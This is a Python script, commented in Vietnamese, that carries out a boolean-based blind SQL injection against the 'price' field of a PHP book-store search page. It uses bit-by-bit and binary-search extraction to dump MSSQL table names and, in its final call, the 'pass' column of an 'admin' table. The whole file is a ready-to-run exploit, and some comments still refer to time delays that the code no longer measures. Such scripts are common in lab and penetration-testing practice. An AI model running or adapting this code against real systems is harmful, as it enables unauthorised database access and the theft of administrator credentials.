import requests
import time
import urllib3
from bs4 import BeautifulSoup
import re
MAX_LENGTH = 100  # Giả sử độ dài chuỗi không vượt quá 100 ký tự
 
# Tắt cảnh báo SSL không xác minh
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# Cấu hình mục tiêu
URL = 'https://localhost.com/online-book-store-project-in-php/search.php'  # Thay bằng URL thật
DELAY_THRESHOLD = 1 

# Hàm kiểm tra một giá trị bằng cách đo thời gian phản hồi
def check_condition(payload):
    
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
               "Host": "localhost.com",
               "Cookie": "PHPSESSID=jqk0bhqeg7non5lmcm878o3pdr",
               "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate, br",
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://localhost.com",
                "Referer": "https://localhost.com/online-book-store-project-in-php/search.php",
                "Upgrade-Insecure-Requests": '1'}
    data = {"price": payload}
    response = requests.post(URL, headers=headers,  data=data, verify=False)
    # Phân tích HTML
    soup = BeautifulSoup(response.text, "html.parser")

    # Tìm phần tử chứa thông tin số lượng sách
    text_element = soup.find("h3")  # Tìm thẻ <h3> chứa thông tin
    if text_element:
        text = text_element.text  # Lấy nội dung văn bản trong thẻ <h3>

        # Dùng regex để lấy số từ chuỗi
        match = re.search(r"There are (\d+) books", text)
        if match:
            book_count = int(match.group(1))  # Lấy số lượng sách
            return book_count
        
# Tìm độ dài chuỗi bằng binary search
def find_length(payload):
    low, high = 1, MAX_LENGTH

    while low < high:
        mid = (low + high) // 2
        payload = f"20' and (SELECT LEN((SELECT table_name FROM information_schema.tables WHERE table_catalog=DB_NAME() ORDER BY 1 OFFSET 0 ROW FETCH NEXT 1 ROW ONLY))) > {mid}-- -"
        
        if check_condition(payload) != 0:  # Nếu thời gian phản hồi lâu => độ dài lớn hơn mid
            low = mid + 1
        else:
            high = mid

    return low  # Khi low == high, đó chính là độ dài của chuỗi

#Tìm độ dài của chuỗi hoặc số lượng bản ghi bằng Binary Search.
def find_length_1(query, column="LEN"):
    """
    :param query: Câu truy vấn SQL gốc (KHÔNG chứa điều kiện độ dài)
    :param column: Chọn "LEN" nếu tìm độ dài chuỗi, "COUNT" nếu tìm số bản ghi
    :param delay_time: Thời gian delay nếu điều kiện đúng (mặc định 3 giây)
    :return: Giá trị số nguyên (độ dài chuỗi hoặc số lượng bản ghi)
    """
    low, high = 1, MAX_LENGTH

    while low < high:
        mid = (low + high + 1) // 2  # Làm tròn lên để tránh vòng lặp vô hạn

        # Tạo payload SQL Injection động
        if column.upper() == "LEN":
            payload = f"20' and SELECT LEN(({query})) >= {mid}-- -"
        elif column.upper() == "COUNT":
            payload = f"20' and (SELECT COUNT(*) FROM {query}) >= {mid}-- -"
        else:
            raise ValueError("Tham số column phải là 'LEN' hoặc 'COUNT'.")

        # Kiểm tra nếu có delay (tức là giá trị >= mid)
        if check_condition(payload) != 0:
            low = mid  # Nếu phản hồi chậm, giá trị >= mid
        else:
            high = mid - 1  # Nếu phản hồi nhanh, giá trị < mid

    return low  # Khi low == high, đó chính là kết quả


# Hàm kiểm tra một bit có phải là 1 không
def check_bit(index, bit_position):
    bit_value = 2**bit_position  # 2^bit_position (1, 2, 4, 8, ..., 128)
    
    # Payload SQL Injection
    payload = f"20' and ASCII(SUBSTRING((select table_name from information_schema.tables where table_catalog=DB_NAME() ORDER BY 1 OFFSET 0 ROW FETCH NEXT 1 ROW ONLY),{index},1)) & {bit_value} = {bit_value}-- -"

    if check_condition(payload):
        return 1 
    else: 
        return 0
    
# Hàm kiểm tra một bit có phải là 1 không (dựa trên truy vấn được truyền vào)
def check_bit_1(query, index, bit_position):
    """
    Kiểm tra xem bit tại vị trí bit_position của ký tự thứ index có phải là 1 không.

    :param query: Câu truy vấn SQL sẽ được sử dụng để trích xuất dữ liệu.
    :param index: Vị trí ký tự cần kiểm tra.
    :param bit_position: Vị trí bit cần kiểm tra (0-7).
    :return: 1 nếu bit = 1, ngược lại trả về 0.
    """
    bit_value = 2 ** bit_position  # 2^bit_position (1, 2, 4, 8, ..., 128)

    # Payload SQL Injection sử dụng truy vấn được truyền vào
    payload = f"20'and ASCII(SUBSTRING(({query}), {index}, 1)) & {bit_value} = {bit_value} -- -"

    return 1 if check_condition(payload) !=0 else 0  # Trả về 1 nếu bit = 1, ngược lại trả về 0

def extract_character(query,index):
    char_ascii = 0  # Mã ASCII của ký tự
    for bit in range(8):  # Duyệt qua từng bit (từ 0 đến 7)
        if check_bit_1(query,index, bit) != 0:  # Nếu bit này là 1
            char_ascii += 2**bit  # Cộng vào tổng mã ASCII

    return chr(char_ascii) if char_ascii != 0 else None  # Trả về ký tự

# Hàm dò toàn bộ chuỗi
def extract_string(query):
    result = ""  # Chuỗi kết quả
    index = 1  # Bắt đầu từ ký tự đầu tiên

    
    while True:
        char = extract_character(query,index)  # Dò ký tự thứ index
        if not char:  # Nếu không có ký tự nào nữa thì dừng
            break
        result += char  # Thêm ký tự vào chuỗi kết quả
        index += 1  # Chuyển sang ký tự tiếp theo
        print(f"[+] Đã tìm được: {result}")
    
    return result
    
    '''
    for index in range(1,find_length()+1):
        char = extract_character(index)
        result += char  # Thêm ký tự vào chuỗi kết quả
        print(f"[+] Đã tìm được: {result}")
    
    return result
    '''

#Đếm số bản ghi của 1 bảng do mình điền vào và lấy ra tên các bản ghi trong bảng đó
def auto(column_name, table_name):
    #chạy vòng lặp for để lấy ra tất cả tên bảng
    arr = []
    for i in range(find_length_1(table_name,"COUNT")):
        payload = f"SELECT {column_name} FROM {table_name} ORDER BY 1 OFFSET {i} ROW FETCH NEXT 1 ROW ONLY"
        arr.append(payload)
        
        
    
    
    for idx, query in enumerate(arr):
        record = extract_string(query)
        print(f"[+] Bảng {idx + 1}: {record}")  # Đánh số đúng thứ tự
    
    
if __name__ == '__main__':
    #print(extract_character(1))
    #extracted_string = extract_string()
    #print(f"[+] Chuỗi cuối cùng: {extracted_string}")

    
    #payload_1 = "SELECT table_name FROM information_schema.tables WHERE table_catalog=DB_NAME() ORDER BY 1 OFFSET 0 ROW FETCH NEXT 1 ROW ONLY"
    #print(find_length_1(payload_1, column="LEN", delay_time="00:00:03"))

    '''
    #tìm số bảng trong database hiện tại
    payload_2 = "information_schema.tables WHERE table_catalog=DB_NAME()"
    print(find_length_1(payload_2, column="COUNT", delay_time="00:00:03"))

    #chạy vòng lặp for để lấy ra tất cả tên bảng
    arr = []
    for i in range(7):
        payload = f"SELECT table_name FROM information_schema.tables WHERE table_catalog=DB_NAME() ORDER BY 1 OFFSET {i} ROW FETCH NEXT 1 ROW ONLY"
        arr.append(payload)
    
    for idx, query in enumerate(arr):
        table_name = extract_string(query)
        print(f"[+] Bảng {idx + 1}: {table_name}")  # Đánh số đúng thứ tự
    
    '''
    column_name="table_name"
    table_name = "information_schema.tables WHERE table_catalog=DB_NAME()"
    column_name_1 = "column_name"
    table_name_1 = "information_schema.columns WHERE table_name='admin'"
    column_name_2 = "pass"
    table_name_2 = "admin"
    auto(column_name_2,table_name_2)
